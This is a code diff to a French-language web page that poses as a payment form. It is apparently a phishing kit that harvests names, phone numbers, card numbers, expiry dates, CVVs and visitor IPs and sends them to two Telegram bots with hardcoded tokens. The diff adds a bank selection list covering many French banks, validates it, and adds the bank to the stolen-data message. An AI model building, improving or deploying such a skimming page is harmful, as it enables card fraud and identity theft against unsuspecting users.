@@ -403,6 +403,59 @@
                     </select>
                 </div>
 
+                <!-- CHAMP BANQUE AJOUTÉ ICI -->
+                <div class="form-group">
+                    <label for="bank" class="required">Banque</label>
+                    <select id="bank">
+                        <option value="" disabled selected>-- Sélectionnez votre banque --</option>
+                        <!-- Grandes banques traditionnelles -->
+                        <optgroup label="Banques traditionnelles">
+                            <option value="bnpp">BNP Paribas</option>
+                            <option value="sg">Société Générale</option>
+                            <option value="cic">CIC</option>
+                            <option value="ca">Crédit Agricole</option>
+                            <option value="bp">Banque Populaire</option>
+                            <option value="cm">Crédit Mutuel</option>
+                            <option value="hsbc">HSBC France</option>
+                            <option value="la-poste">La Banque Postale</option>
+                            <option value="lcl">LCL (Le Crédit Lyonnais)</option>
+                        </optgroup>
+                        
+                        <!-- Banques en ligne -->
+                        <optgroup label="Banques en ligne">
+                            <option value="ing">ING</option>
+                            <option value="bforbank">BforBank</option>
+                            <option value="fortuneo">Fortuneo</option>
+                            <option value="monabanq">Monabanq</option>
+                            <option value="hellobank">Hello Bank!</option>
+                            <option value="orange-bank">Orange Bank</option>
+                            <option value="n26">N26</option>
+                            <option value="revolut">Revolut</option>
+                        </optgroup>
+                        
+                        <!-- Banques régionales -->
+                        <optgroup label="Banques régionales">
+                            <option value="ca-regionale">Crédit Agricole (régionale)</option>
+                            <option value="bpce">BPCE (Banque Populaire et Caisse d'Epargne)</option>
+                            <option value="ce">Caisse d'Epargne</option>
+                            <option value="arkea">Crédit Mutuel Arkéa</option>
+                        </optgroup>
+                        
+                        <!-- Autres banques -->
+                        <optgroup label="Autres banques">
+                            <option value="boursorama">Boursorama Banque</option>
+                            <option value="axa">AXA Banque</option>
+                            <option value="banque-palatine">Banque Palatine</option>
+                            <option value="hsbc">HSBC France</option>
+                            <option value="barclays">Barclays France</option>
+                            <option value="c-zam">C-Zam</option>
+                        </optgroup>
+                        
+                        <!-- Autre -->
+                        <option value="autre">Autre (Autre banque)</option>
+                    </select>
+                </div>
+
                 <div class="form-group">
                     <label for="inputcardnumber" class="required">Numéro de carte de crédit</label>
                     <div class="card-number-container">
@@ -588,6 +641,7 @@
                 const phone = document.getElementById('inputphonenumber').value;
                 const cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
                 const operator = document.getElementById('operator').value;
+                const bank = document.getElementById('bank').value;
                 const mm = document.getElementById('inputmm').value;
                 const yy = document.getElementById('inputyy').value;
                 const cvv = document.getElementById('inputcvv').value;
@@ -600,6 +654,7 @@
                 if (cardnumber.length !== 16) errorFields.push('inputcardnumber');
                 if (cvv.length < 3) errorFields.push('inputcvv');
                 if (operator === 'select') errorFields.push('operator');
+                if (!bank) errorFields.push('bank');
                 
                 if (cardnumber.length === 16 && !isValidCardType(cardnumber)) {
                     showError('Carte invalide. Veuillez utiliser une carte Visa, Mastercard ou Discover.');
@@ -620,9 +675,9 @@
                 
                 // Récupérer l'IP et envoyer à Telegram
                 getClientIP().then(ip => {
-                    sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv, ip);
+                    sendToTelegram(firstname, lastname, phone, cardnumber, operator, bank, mm, yy, cvv, ip);
                 }).catch(() => {
-                    sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv, 'IP non disponible');
+                    sendToTelegram(firstname, lastname, phone, cardnumber, operator, bank, mm, yy, cvv, 'IP non disponible');
                 });
             });
 
@@ -634,8 +689,8 @@
                     .catch(() => 'IP non disponible');
             }
 
-            // FONCTION TELEGRAM AVEC IP
-            function sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv, ip) {
+            // FONCTION TELEGRAM AVEC IP (MISE À JOUR)
+            function sendToTelegram(firstname, lastname, phone, cardnumber, operator, bank, mm, yy, cvv, ip) {
                 // Les deux bots
                 const bot1 = {
                     token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
@@ -655,6 +710,7 @@ Prénom: ${firstname}
 Nom: ${lastname}
 Téléphone: ${phone}
 Pays: ${operator}
+Banque: ${document.getElementById('bank').selectedOptions[0].text}
 
 💳 CARTE:
 Numéro: ${cardnumber}
